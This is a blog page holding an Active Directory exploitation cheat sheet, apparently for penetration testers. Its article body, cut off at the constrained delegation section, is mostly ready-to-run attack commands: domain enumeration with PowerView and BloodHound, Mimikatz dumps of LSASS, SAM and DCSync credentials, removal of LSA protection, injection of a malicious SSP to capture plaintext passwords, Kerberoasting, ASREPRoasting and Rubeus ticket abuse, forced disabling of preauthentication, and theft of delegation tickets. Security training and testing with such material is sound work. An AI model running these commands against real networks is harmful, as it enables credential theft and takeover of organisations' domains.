<!doctype html><html lang=en dir=auto data-theme=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>Active Directory Exploitation Cheat Sheet | Classroom</title><meta name=keywords content="notes"><meta name=description content="Active Directory Exploitation Cheat Sheet
A cheat sheet that contains common enumeration and attack methods for Windows Active Directory.
This cheat sheet is inspired by the PayloadAllTheThings repo.

Summary

Active Directory Exploitation Cheat Sheet

Summary
Tools
Domain Enumeration

Using PowerView
Using AD Module
Using BloodHound
Useful Enumeration Tools


Local Privilege Escalation

Useful Local Priv Esc Tools


Lateral Movement

Powershell Remoting
Remote Code Execution with PS Credentials
Import a powershell module and execute its functions remotely
Executing Remote Stateful commands
Mimikatz
Useful Tools


Domain Privilege Escalation

Kerberoast
ASREPRoast
Password Spray Attack
Force Set SPN
Abusing Shadow Copies
List and Decrypt Stored Credentials using Mimikatz
Unconstrained Delegation
Constrained Delegation
Resource Based Constrained Delegation
DNSAdmins Abuse
Abusing Active Directory-Integraded DNS
Abusing Backup Operators Group
Abusing Exchange
Weaponizing Printer Bug
Abusing ACLs
Abusing IPv6 with mitm6
SID History Abuse
Exploiting SharePoint
Zerologon Exploit


Domain Persistence

Golden Ticket Attack
DCsync Attack
Silver Ticket Attack
Skeleton Key Attack
DSRM Abuse
Custom SSP


Cross Forest Attacks

Trust Tickets
Abuse MSSQL Servers
Breaking Forest Trusts





Tools

Powersploit
PowerUpSQL
Powermad
Impacket
Mimikatz
Rubeus -> Compiled Version
BloodHound
AD Module
ASREPRoast

Domain Enumeration
Using PowerView
Powerview v.3.0
Powerview Wiki"><meta name=author content="Animesh Roy"><link rel=canonical href=https://classroom.anir0y.in/post/active-directory-exploitation-cheat-sheet/><link crossorigin=anonymous href=/assets/css/stylesheet.da3211e5ef867bf2b75fd5a6515cfed7195c011e8ab735694e203810a827097b.css integrity="sha256-2jIR5e+Ge/K3X9WmUVz+1xlcAR6KtzVpTiA4EKgnCXs=" rel="preload stylesheet" as=style><link rel=icon href=https://classroom.anir0y.in/img/avatar.jpeg><link rel=icon type=image/png sizes=16x16 href=https://classroom.anir0y.in/img/avatar.jpeg><link rel=icon type=image/png sizes=32x32 href=https://classroom.anir0y.in/img/avatar.jpeg><link rel=apple-touch-icon href=https://classroom.anir0y.in/img/avatar.jpeg><link rel=mask-icon href=https://classroom.anir0y.in/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=https://classroom.anir0y.in/post/active-directory-exploitation-cheat-sheet/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51);color-scheme:dark}.list{background:var(--theme)}.toc{background:var(--entry)}}@media(prefers-color-scheme:light){.list::-webkit-scrollbar-thumb{border-color:var(--code-bg)}}</style></noscript><script>localStorage.getItem("pref-theme")==="dark"?document.querySelector("html").dataset.theme="dark":localStorage.getItem("pref-theme")==="light"?document.querySelector("html").dataset.theme="light":window.matchMedia("(prefers-color-scheme: dark)").matches?document.querySelector("html").dataset.theme="dark":document.querySelector("html").dataset.theme="light"</script><meta property="og:url" content="https://classroom.anir0y.in/post/active-directory-exploitation-cheat-sheet/"><meta property="og:site_name" content="Classroom"><meta property="og:title" content="Active Directory Exploitation Cheat Sheet"><meta property="og:description" content="Active Directory Exploitation Cheat Sheet A cheat sheet that contains common enumeration and attack methods for Windows Active Directory.
This cheat sheet is inspired by the PayloadAllTheThings repo.
Summary Active Directory Exploitation Cheat Sheet Summary Tools Domain Enumeration Using PowerView Using AD Module Using BloodHound Useful Enumeration Tools Local Privilege Escalation Useful Local Priv Esc Tools Lateral Movement Powershell Remoting Remote Code Execution with PS Credentials Import a powershell module and execute its functions remotely Executing Remote Stateful commands Mimikatz Useful Tools Domain Privilege Escalation Kerberoast ASREPRoast Password Spray Attack Force Set SPN Abusing Shadow Copies List and Decrypt Stored Credentials using Mimikatz Unconstrained Delegation Constrained Delegation Resource Based Constrained Delegation DNSAdmins Abuse Abusing Active Directory-Integraded DNS Abusing Backup Operators Group Abusing Exchange Weaponizing Printer Bug Abusing ACLs Abusing IPv6 with mitm6 SID History Abuse Exploiting SharePoint Zerologon Exploit Domain Persistence Golden Ticket Attack DCsync Attack Silver Ticket Attack Skeleton Key Attack DSRM Abuse Custom SSP Cross Forest Attacks Trust Tickets Abuse MSSQL Servers Breaking Forest Trusts Tools Powersploit PowerUpSQL Powermad Impacket Mimikatz Rubeus -> Compiled Version BloodHound AD Module ASREPRoast Domain Enumeration Using PowerView Powerview v.3.0
Powerview Wiki"><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="article:section" content="post"><meta property="article:published_time" content="2021-05-07T14:00:36+05:30"><meta property="article:modified_time" content="2021-05-07T14:00:36+05:30"><meta property="article:tag" content="Notes"><meta property="og:image" content="https://classroom.anir0y.in/img/blog.png"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://classroom.anir0y.in/img/blog.png"><meta name=twitter:title content="Active Directory Exploitation Cheat Sheet"><meta name=twitter:description content="Active Directory Exploitation Cheat Sheet
A cheat sheet that contains common enumeration and attack methods for Windows Active Directory.
This cheat sheet is inspired by the PayloadAllTheThings repo.

Summary

Active Directory Exploitation Cheat Sheet

Summary
Tools
Domain Enumeration

Using PowerView
Using AD Module
Using BloodHound
Useful Enumeration Tools


Local Privilege Escalation

Useful Local Priv Esc Tools


Lateral Movement

Powershell Remoting
Remote Code Execution with PS Credentials
Import a powershell module and execute its functions remotely
Executing Remote Stateful commands
Mimikatz
Useful Tools


Domain Privilege Escalation

Kerberoast
ASREPRoast
Password Spray Attack
Force Set SPN
Abusing Shadow Copies
List and Decrypt Stored Credentials using Mimikatz
Unconstrained Delegation
Constrained Delegation
Resource Based Constrained Delegation
DNSAdmins Abuse
Abusing Active Directory-Integraded DNS
Abusing Backup Operators Group
Abusing Exchange
Weaponizing Printer Bug
Abusing ACLs
Abusing IPv6 with mitm6
SID History Abuse
Exploiting SharePoint
Zerologon Exploit


Domain Persistence

Golden Ticket Attack
DCsync Attack
Silver Ticket Attack
Skeleton Key Attack
DSRM Abuse
Custom SSP


Cross Forest Attacks

Trust Tickets
Abuse MSSQL Servers
Breaking Forest Trusts





Tools

Powersploit
PowerUpSQL
Powermad
Impacket
Mimikatz
Rubeus -> Compiled Version
BloodHound
AD Module
ASREPRoast

Domain Enumeration
Using PowerView
Powerview v.3.0
Powerview Wiki"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://classroom.anir0y.in/post/"},{"@type":"ListItem","position":2,"name":"Active Directory Exploitation Cheat Sheet","item":"https://classroom.anir0y.in/post/active-directory-exploitation-cheat-sheet/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Active Directory Exploitation Cheat Sheet","name":"Active Directory Exploitation Cheat Sheet","description":"Active Directory Exploitation Cheat Sheet A cheat sheet that contains common enumeration and attack methods for Windows Active Directory.\nThis cheat sheet is inspired by the PayloadAllTheThings repo.\nSummary Active Directory Exploitation Cheat Sheet Summary Tools Domain Enumeration Using PowerView Using AD Module Using BloodHound Useful Enumeration Tools Local Privilege Escalation Useful Local Priv Esc Tools Lateral Movement Powershell Remoting Remote Code Execution with PS Credentials Import a powershell module and execute its functions remotely Executing Remote Stateful commands Mimikatz Useful Tools Domain Privilege Escalation Kerberoast ASREPRoast Password Spray Attack Force Set SPN Abusing Shadow Copies List and Decrypt Stored Credentials using Mimikatz Unconstrained Delegation Constrained Delegation Resource Based Constrained Delegation DNSAdmins Abuse Abusing Active Directory-Integraded DNS Abusing Backup Operators Group Abusing Exchange Weaponizing Printer Bug Abusing ACLs Abusing IPv6 with mitm6 SID History Abuse Exploiting SharePoint Zerologon Exploit Domain Persistence Golden Ticket Attack DCsync Attack Silver Ticket Attack Skeleton Key Attack DSRM Abuse Custom SSP Cross Forest Attacks Trust Tickets Abuse MSSQL Servers Breaking Forest Trusts Tools Powersploit PowerUpSQL Powermad Impacket Mimikatz Rubeus -\u0026gt; Compiled Version BloodHound AD Module ASREPRoast Domain Enumeration Using PowerView Powerview v.3.0\nPowerview Wiki\n","keywords":["notes"],"articleBody":"Active Directory Exploitation Cheat Sheet A cheat sheet that contains common enumeration and attack methods for Windows Active Directory.\nThis cheat sheet is inspired by the PayloadAllTheThings repo.\nSummary Active Directory Exploitation Cheat Sheet Summary Tools Domain Enumeration Using PowerView Using AD Module Using BloodHound Useful Enumeration Tools Local Privilege Escalation Useful Local Priv Esc Tools Lateral Movement Powershell Remoting Remote Code Execution with PS Credentials Import a powershell module and execute its functions remotely Executing Remote Stateful commands Mimikatz Useful Tools Domain Privilege Escalation Kerberoast ASREPRoast Password Spray Attack Force Set SPN Abusing Shadow Copies List and Decrypt Stored Credentials using Mimikatz Unconstrained Delegation Constrained Delegation Resource Based Constrained Delegation DNSAdmins Abuse Abusing Active Directory-Integraded DNS Abusing Backup Operators Group Abusing Exchange Weaponizing Printer Bug Abusing ACLs Abusing IPv6 with mitm6 SID History Abuse Exploiting SharePoint Zerologon Exploit Domain Persistence Golden Ticket Attack DCsync Attack Silver Ticket Attack Skeleton Key Attack DSRM Abuse Custom SSP Cross Forest Attacks Trust Tickets Abuse MSSQL Servers Breaking Forest Trusts Tools Powersploit PowerUpSQL Powermad Impacket Mimikatz Rubeus -\u003e Compiled Version BloodHound AD Module ASREPRoast Domain Enumeration Using PowerView Powerview v.3.0\nPowerview Wiki\nGet Current Domain: Get-Domain Enumerate Other Domains: Get-Domain -Domain Get Domain SID: Get-DomainSID Get Domain Policy: Get-DomainPolicy #Will show us the policy configurations of the Domain about system access or kerberos Get-DomainPolicy | Select-Object -ExpandProperty SystemAccess Get-DomainPolicy | Select-Object -ExpandProperty KerberosPolicy Get Domain Controllers: Get-DomainController Get-DomainController -Domain Enumerate Domain Users: #Save all Domain Users to a file Get-DomainUser | Out-File -FilePath .\\DomainUsers.txt #Will return specific properties of a specific user Get-DomainUser -Identity [username] -Properties DisplayName, MemberOf | Format-List #Enumerate user logged on a machine Get-NetLoggedon -ComputerName #Enumerate Session Information for a machine Get-NetSession -ComputerName #Enumerate domain machines of the current/specified domain where specific users are logged into Find-DomainUserLocation -Domain | Select-Object UserName, SessionFromName Enum Domain Computers: Get-DomainComputer -Properties OperatingSystem, Name, DnsHostName | Sort-Object -Property DnsHostName #Enumerate Live machines Get-DomainComputer -Ping -Properties OperatingSystem, Name, DnsHostName | Sort-Object -Property DnsHostName Enum Groups and Group Members: #Save all Domain Groups to a file: Get-DomainGroup | Out-File -FilePath .\\DomainGroup.txt #Return members of Specific Group (eg. Domain Admins \u0026 Enterprise Admins) Get-DomainGroup -Identity '' | Select-Object -ExpandProperty Member Get-DomainGroupMember -Identity '' | Select-Object MemberDistinguishedName #Enumerate the local groups on the local (or remote) machine. Requires local admin rights on the remote machine Get-NetLocalGroup | Select-Object GroupName #Enumerates members of a specific local group on the local (or remote) machine. Also requires local admin rights on the remote machine Get-NetLocalGroupMember -GroupName Administrators | Select-Object MemberName, IsGroup, IsDomain #Return all GPOs in a domain that modify local group memberships through Restricted Groups or Group Policy Preferences Get-DomainGPOLocalGroup | Select-Object GPODisplayName, GroupName Enumerate Shares: #Enumerate Domain Shares Find-DomainShare #Enumerate Domain Shares the current user has access Find-DomainShare -CheckShareAccess #Enumerate \"Interesting\" Files on accessible shares Find-InterestingDomainShareFile -Include *passwords* Enum Group Policies: Get-DomainGPO -Properties DisplayName | Sort-Object -Property DisplayName #Enumerate all GPOs to a specific computer Get-DomainGPO -ComputerIdentity -Properties DisplayName | Sort-Object -Property DisplayName #Get users that are part of a Machine's local Admin group Get-DomainGPOComputerLocalGroupMapping -ComputerName Enum OUs: Get-DomainOU -Properties Name | Sort-Object -Property Name Enum ACLs: # Returns the ACLs associated with the specified account Get-DomaiObjectAcl -Identity -ResolveGUIDs #Search for interesting ACEs Find-InterestingDomainAcl -ResolveGUIDs #Check the ACLs associated with a specified path (e.g smb share) Get-PathAcl -Path \"\\\\Path\\Of\\A\\Share\" Enum Domain Trust: Get-DomainTrust Get-DomainTrust -Domain #Enumerate all trusts for the current domain and then enumerates all trusts for each domain it finds Get-DomainTrustMapping Enum Forest Trust: Get-ForestDomain Get-ForestDomain -Forest #Map the Trust of the Forest Get-ForestTrust Get-ForestTrust -Forest User Hunting: #Finds all machines on the current domain where the current user has local admin access Find-LocalAdminAccess -Verbose #Find local admins on all machines of the domain Find-DomainLocalGroupMember -Verbose #Find computers were a Domain Admin OR a spesified user has a session Find-DomainUserLocation | Select-Object UserName, SessionFromName #Confirming admin access Test-AdminAccess :heavy_exclamation_mark: Priv Esc to Domain Admin with User Hunting: I have local admin access on a machine -\u003e A Domain Admin has a session on that machine -\u003e I steal his token and impersonate him -\u003e Profit! Using AD Module Get Current Domain: Get-ADDomain Enum Other Domains: Get-ADDomain -Identity Get Domain SID: Get-DomainSID Get Domain Controlers: Get-ADDomainController Get-ADDomainController -Identity Enumerate Domain Users: Get-ADUser -Filter * -Identity -Properties * #Get a spesific \"string\" on a user's attribute Get-ADUser -Filter 'Description -like \"*wtver*\"' -Properties Description | select Name, Description Enum Domain Computers: Get-ADComputer -Filter * -Properties * Get-ADGroup -Filter * Enum Domain Trust: Get-ADTrust -Filter * Get-ADTrust -Identity Enum Forest Trust: Get-ADForest Get-ADForest -Identity #Domains of Forest Enumeration (Get-ADForest).Domains Enum Local AppLocker Effective Policy: Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections Using BloodHound #Using exe ingestor .\\SharpHound.exe --CollectionMethod All --LDAPUser --LDAPPass --JSONFolder #Using powershell module ingestor . .\\SharpHound.ps1 Invoke-BloodHound -CollectionMethod All -LDAPUser -LDAPPass -OutputDirectory Useful Enumeration Tools ldapdomaindump Information dumper via LDAP adidnsdump Integrated DNS dumping by any authenticated user ACLight Advanced Discovery of Privileged Accounts ADRecon Detailed Active Directory Recon Tool Local Privilege Escalation Useful Local Priv Esc Tools PowerUp Misconfiguration Abuse\nBeRoot General Priv Esc Enumeration Tool\nPrivesc General Priv Esc Enumeration Tool\nFullPowers Restore A Service Account’s Privileges\nJuicy Potato Abuse SeImpersonate or SeAssignPrimaryToken Privileges for System Impersonation\n:warning: Works only until Windows Server 2016 and Windows 10 until patch 1803\nLovely Potato Automated Juicy Potato\n:warning: Works only until Windows Server 2016 and Windows 10 until patch 1803\nPrintSpoofer Exploit the PrinterBug for System Impersonation\n:pray: Works for Windows Server 2019 and Windows 10\nRoguePotato Upgraded Juicy Potato\n:pray: Works for Windows Server 2019 and Windows 10\nAbusing Token Privileges\nSMBGhost CVE-2020-0796 PoC\nLateral Movement Powershell Remoting #Enable Powershell Remoting on current Machine (Needs Admin Access) Enable-PSRemoting #Entering or Starting a new PSSession (Needs Admin Access) $sess = New-PSSession -ComputerName Enter-PSSession -ComputerName OR -Sessions Remote Code Execution with PS Credentials $SecPassword = ConvertTo-SecureString '' -AsPlainText -Force $Cred = New-Object System.Management.Automation.PSCredential('htb.local\\', $SecPassword) Invoke-Command -ComputerName -Credential $Cred -ScriptBlock {whoami} Import a powershell module and execute its functions remotely #Execute the command and start a session Invoke-Command -Credential $cred -ComputerName -FilePath c:\\FilePath\\file.ps1 -Session $sess #Interact with the session Enter-PSSession -Session $sess Executing Remote Stateful commands #Create a new session $sess = New-PSSession -ComputerName #Execute command on the session Invoke-Command -Session $sess -ScriptBlock {$ps = Get-Process} #Check the result of the command to confirm we have an interactive session Invoke-Command -Session $sess -ScriptBlock {$ps} Mimikatz #The commands are in cobalt strike format! #Dump LSASS: mimikatz privilege::debug mimikatz token::elevate mimikatz sekurlsa::logonpasswords #(Over) Pass The Hash mimikatz privilege::debug mimikatz sekurlsa::pth /user: /ntlm:\u003c\u003e /domain: #List all available kerberos tickets in memory mimikatz sekurlsa::tickets #Dump local Terminal Services credentials mimikatz sekurlsa::tspkg #Dump and save LSASS in a file mimikatz sekurlsa::minidump c:\\temp\\lsass.dmp #List cached MasterKeys mimikatz sekurlsa::dpapi #List local Kerberos AES Keys mimikatz sekurlsa::ekeys #Dump SAM Database mimikatz lsadump::sam #Dump SECRETS Database mimikatz lsadump::secrets #Inject and dump the Domain Controler's Credentials mimikatz privilege::debug mimikatz token::elevate mimikatz lsadump::lsa /inject #Dump the Domain's Credentials without touching DC's LSASS and also remotely mimikatz lsadump::dcsync /domain: /all #List and Dump local kerberos credentials mimikatz kerberos::list /dump #Pass The Ticket mimikatz kerberos::ptt #List TS/RDP sessions mimikatz ts::sessions #List Vault credentials mimikatz vault::list :exclamation: What if mimikatz fails to dump credentials because of LSA Protection controls ? \\\nLSA as a Protected Process (Kernel Land Bypass) #Check if LSA runs as a protected process by looking if the variable \"RunAsPPL\" is set to 0x1 reg query HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa #Next upload the mimidriver.sys from the official mimikatz repo to same folder of your mimikatz.exe #Now lets import the mimidriver.sys to the system mimikatz # !+ #Now lets remove the protection flags from lsass.exe process mimikatz # !processprotect /process:lsass.exe /remove #Finally run the logonpasswords function to dump lsass mimikatz # sekurlsa::logonpasswords LSA as a Protected Process (Userland Land “Fileless” Bypass)\nPPLdump Bypassing LSA Protection in Userland LSA is running as virtualized process (LSAISO) by Credential Guard\n#Check if a process called lsaiso.exe exists on the running processes tasklist |findstr lsaiso #If it does there isn't a way tou dump lsass, we will only get encrypted data. But we can still use keyloggers or clipboard dumpers to capture data. #Lets inject our own malicious Security Support Provider into memory, for this example i'll use the one mimikatz provides mimikatz # misc::memssp #Now every user session and authentication into this machine will get logged and plaintext credentials will get captured and dumped into c:\\windows\\system32\\mimilsa.log Detailed Mimikatz Guide Poking Around With 2 lsass Protection Options Useful Tools Powercat netcat written in powershell, and provides tunneling, relay and portforward capabilities. SCShell fileless lateral movement tool that relies on ChangeServiceConfigA to run command Evil-Winrm the ultimate WinRM shell for hacking/pentesting RunasCs Csharp and open version of windows builtin runas.exe Domain Privilege Escalation Kerberoast WUT IS DIS?: All standard domain users can request a copy of all service accounts along with their correlating password hashes, so we can ask a TGS for any SPN that is bound to a “user” account, extract the encrypted blob that was encrypted using the user’s password and bruteforce it offline.\nPowerView: #Get User Accounts that are used as Service Accounts Get-NetUser -SPN #Get every available SPN account, request a TGS and dump its hash Invoke-Kerberoast #Requesting the TGS for a single account: Request-SPNTicket #Export all tickets using Mimikatz Invoke-Mimikatz -Command '\"kerberos::list /export\"' AD Module: #Get User Accounts that are used as Service Accounts Get-ADUser -Filter {ServicePrincipalName -ne \"$null\"} -Properties ServicePrincipalName Impacket: python GetUserSPNs.py /: -outputfile Rubeus: #Kerberoasting and outputing on a file with a spesific format Rubeus.exe kerberoast /outfile: /domain: #Kerberoasting whle being \"OPSEC\" safe, essentially while not try to roast AES enabled accounts Rubeus.exe kerberoast /outfile: /domain: /rc4opsec #Kerberoast AES enabled accounts Rubeus.exe kerberoast /outfile: /domain: /aes #Kerberoast spesific user account Rubeus.exe kerberoast /outfile: /domain: /user: /simple #Kerberoast by specifying the authentication credentials Rubeus.exe kerberoast /outfile: /domain: /creduser: /credpassword: ASREPRoast WUT IS DIS?: If a domain user account do not require kerberos preauthentication, we can request a valid TGT for this account without even having domain credentials, extract the encrypted\nblob and bruteforce it offline.\nPowerView: Get-DomainUser -PreauthNotRequired -Verbose AD Module: Get-ADUser -Filter {DoesNotRequirePreAuth -eq $True} -Properties DoesNotRequirePreAuth Forcefully Disable Kerberos Preauth on an account i have Write Permissions or more! Check for interesting permissions on accounts:\nHint: We add a filter e.g. RDPUsers to get “User Accounts” not Machine Accounts, because Machine Account hashes are not crackable!\nPowerView:\nInvoke-ACLScanner -ResolveGUIDs | ?{$_.IdentinyReferenceName -match \"RDPUsers\"} Disable Kerberos Preauth: Set-DomainObject -Identity -XOR @{useraccountcontrol=4194304} -Verbose Check if the value changed: Get-DomainUser -PreauthNotRequired -Verbose And finally execute the attack using the ASREPRoast tool.\n#Get a spesific Accounts hash: Get-ASREPHash -UserName -Verbose #Get any ASREPRoastable Users hashes: Invoke-ASREPRoast -Verbose Using Rubeus:\n#Trying the attack for all domain users Rubeus.exe asreproast /format: /domain: /outfile: #ASREPRoast spesific user Rubeus.exe asreproast /user: /format: /domain: /outfile: #ASREPRoast users of a spesific OU (Organization Unit) Rubeus.exe asreproast /ou: /format: /domain: /outfile: Using Impacket:\n#Trying the attack for the specified users on the file python GetNPUsers.py / -usersfile -outputfile Password Spray Attack If we have harvest some passwords by compromising a user account, we can use this method to try and exploit password reuse on other domain accounts.\nTools:\nDomainPasswordSpray CrackMapExec Invoke-CleverSpray Spray Force Set SPN WUT IS DIS ?: If we have enough permissions -\u003e GenericAll/GenericWrite we can set a SPN on a target account, request a TGS, then grab its blob and bruteforce it.\nPowerView: #Check for interesting permissions on accounts: Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentinyReferenceName -match \"RDPUsers\"} #Check if current user has already an SPN setted: Get-DomainUser -Identity | select serviceprincipalname #Force set the SPN on the account: Set-DomainObject -Set @{serviceprincipalname='ops/whatever1'} AD Module: #Check if current user has already an SPN setted Get-ADUser -Identity -Properties ServicePrincipalName | select ServicePrincipalName #Force set the SPN on the account: Set-ADUser -Identiny -ServicePrincipalNames @{Add='ops/whatever1'} Finally use any tool from before to grab the hash and kerberoast it!\nAbusing Shadow Copies If you have local administrator access on a machine try to list shadow copies, it’s an easy way for Domain Escalation.\n#List shadow copies using vssadmin (Needs Admnistrator Access) vssadmin list shadows #List shadow copies using diskshadow diskshadow list shadows all #Make a symlink to the shadow copy and access it mklink /d c:\\shadowcopy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\ You can dump the backuped SAM database and harvest credentials. Look for DPAPI stored creds and decrypt them. Access backuped sensitive files. List and Decrypt Stored Credentials using Mimikatz Usually encrypted credentials are stored in:\n%appdata%\\Microsoft\\Credentials %localappdata%\\Microsoft\\Credentials #By using the cred function of mimikatz we can enumerate the cred object and get information about it: dpapi::cred /in:\"%appdata%\\Microsoft\\Credentials\\\" #From the previous command we are interested to the \"guidMasterKey\" parameter, that tells us which masterkey was used to encrypt the credential #Lets enumerate the Master Key: dpapi::masterkey /in:\"%appdata%\\Microsoft\\Protect\\\\\" #Now if we are on the context of the user (or system) that the credential belogs to, we can use the /rpc flag to pass the decryption of the masterkey to the domain controler: dpapi::masterkey /in:\"%appdata%\\Microsoft\\Protect\\\\\" /rpc #We now have the masterkey in our local cache: dpapi::cache #Finally we can decrypt the credential using the cached masterkey: dpapi::cred /in:\"%appdata%\\Microsoft\\Credentials\\\" Detailed Article: DPAPI all the things\nUnconstrained Delegation WUT IS DIS ?: If we have Administrative access on a machine that has Unconstrained Delegation enabled, we can wait for a high value target or DA to connect to it, steal his TGT then ptt and impersonate him!\nUsing PowerView:\n#Discover domain joined computers that have Unconstrained Delegation enabled Get-NetComputer -UnConstrained #List tickets and check if a DA or some High Value target has stored its TGT Invoke-Mimikatz -Command '\"sekurlsa::tickets\"' #Command to monitor any incoming sessions on our compromised server Invoke-UserHunter -ComputerName -Poll -UserName -Delay -Verbose #Dump the tickets to disk: Invoke-Mimikatz -Command '\"sekurlsa::tickets /export\"' #Impersonate the user using ptt attack: Invoke-Mimikatz -Command '\"kerberos::ptt \"' Note: We can also use Rubeus!\nConstrained Delegation Using PowerView and Kekeo:\n#Enumerate Users and Computers with constrained delegation Get-DomainUser -TrustedToAuth Get-DomainComputer -TrustedToAuth #If we have a user that has Constrained delegation, we ask for a valid tgt of this user using kekeo tgt::ask /user: /domain:","wordCount":"4370","inLanguage":"en","image":"https://classroom.anir0y.in/img/blog.png","datePublished":"2021-05-07T14:00:36+05:30","dateModified":"2021-05-07T14:00:36+05:30","author":{"@type":"Person","name":"Animesh Roy"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://classroom.anir0y.in/post/active-directory-exploitation-cheat-sheet/"},"publisher":{"@type":"Organization","name":"Classroom","logo":{"@type":"ImageObject","url":"https://classroom.anir0y.in/img/avatar.jpeg"}}}</script></head><body id=top><header class=header><nav class=nav><div class=logo><a href=https://classroom.anir0y.in/ accesskey=h title="Classroom (Alt + H)"><img src=https://classroom.anir0y.in/img/avatar.jpeg alt aria-label=logo height=35>Classroom</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)" aria-label="Toggle theme">
<svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
<svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://classroom.anir0y.in/post/ title=Posts><span>Posts</span></a></li><li><a href=https://classroom.anir0y.in/categories/ title=Categories><span>Categories</span></a></li><li><a href=https://classroom.anir0y.in/tags/ title=Tags><span>Tags</span></a></li><li><a href=https://classroom.anir0y.in/archives/ title=Archives><span>Archives</span></a></li><li><a href=https://classroom.anir0y.in/search/ title="Search (Alt + /)" accesskey=/><span>Search</span></a></li><li><a href=https://classroom.anir0y.in/about/me/ title=About><span>About</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://classroom.anir0y.in/>Home</a>&nbsp;»&nbsp;<a href=https://classroom.anir0y.in/post/>Posts</a></div><h1 class="post-title entry-hint-parent">Active Directory Exploitation Cheat Sheet</h1><div class=post-meta><span title='2021-05-07 14:00:36 +0530 IST'>May 7, 2021</span>&nbsp;·&nbsp;<span>21 min</span>&nbsp;·&nbsp;<span>Animesh Roy</span>&nbsp;|&nbsp;<span>
<a href=https://github.com/anir0y/classroom/tree/master/content/post/Active-Directory-Exploitation-Cheat-Sheet.md rel="noopener noreferrer edit" target=_blank>Suggest Changes</a></span></div></header><figure class=entry-cover><img loading=eager src=https://classroom.anir0y.in/img/blog.png alt="cover image"></figure><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><nav id=TableOfContents><ul><li><a href=#summary>Summary</a></li><li><a href=#tools>Tools</a></li><li><a href=#domain-enumeration>Domain Enumeration</a><ul><li><a href=#using-powerview>Using PowerView</a></li><li><a href=#using-ad-module>Using AD Module</a></li><li><a href=#using-bloodhound>Using BloodHound</a></li><li><a href=#useful-enumeration-tools>Useful Enumeration Tools</a></li></ul></li><li><a href=#local-privilege-escalation>Local Privilege Escalation</a><ul><li><a href=#useful-local-priv-esc-tools>Useful Local Priv Esc Tools</a></li></ul></li><li><a href=#lateral-movement>Lateral Movement</a><ul><li><a href=#powershell-remoting>Powershell Remoting</a></li><li><a href=#remote-code-execution-with-ps-credentials>Remote Code Execution with PS Credentials</a></li><li><a href=#import-a-powershell-module-and-execute-its-functions-remotely>Import a powershell module and execute its functions remotely</a></li><li><a href=#executing-remote-stateful-commands>Executing Remote Stateful commands</a></li><li><a href=#mimikatz>Mimikatz</a></li><li><a href=#useful-tools>Useful Tools</a></li></ul></li><li><a href=#domain-privilege-escalation>Domain Privilege Escalation</a><ul><li><a href=#kerberoast>Kerberoast</a></li><li><a href=#asreproast>ASREPRoast</a></li><li><a href=#password-spray-attack>Password Spray Attack</a></li><li><a href=#force-set-spn>Force Set SPN</a></li><li><a href=#abusing-shadow-copies>Abusing Shadow Copies</a></li><li><a href=#list-and-decrypt-stored-credentials-using-mimikatz>List and Decrypt Stored Credentials using Mimikatz</a></li><li><a href=#unconstrained-delegation>Unconstrained Delegation</a></li><li><a href=#constrained-delegation>Constrained Delegation</a></li><li><a href=#resource-based-constrained-delegation>Resource Based Constrained Delegation</a></li><li><a href=#dnsadmins-abuse>DNSAdmins Abuse</a></li><li><a href=#abusing-active-directory-integraded-dns>Abusing Active Directory-Integraded DNS</a></li><li><a href=#abusing-backup-operators-group>Abusing Backup Operators Group</a></li><li><a href=#abusing-exchange>Abusing Exchange</a></li><li><a href=#weaponizing-printer-bug>Weaponizing Printer Bug</a></li><li><a href=#abusing-acls>Abusing ACLs</a></li><li><a href=#abusing-ipv6-with-mitm6>Abusing IPv6 with mitm6</a></li><li><a href=#sid-history-abuse>SID History Abuse</a></li><li><a href=#exploiting-sharepoint>Exploiting SharePoint</a></li><li><a href=#zerologon-exploit>Zerologon Exploit</a></li></ul></li><li><a href=#domain-persistence>Domain Persistence</a><ul><li><a href=#golden-ticket-attack>Golden Ticket Attack</a></li><li><a href=#dcsync-attack>DCsync Attack</a></li><li><a href=#silver-ticket-attack>Silver Ticket Attack</a></li><li><a href=#skeleton-key-attack>Skeleton Key Attack</a></li><li><a href=#dsrm-abuse>DSRM Abuse</a></li><li><a href=#custom-ssp>Custom SSP</a></li></ul></li><li><a href=#cross-forest-attacks>Cross Forest 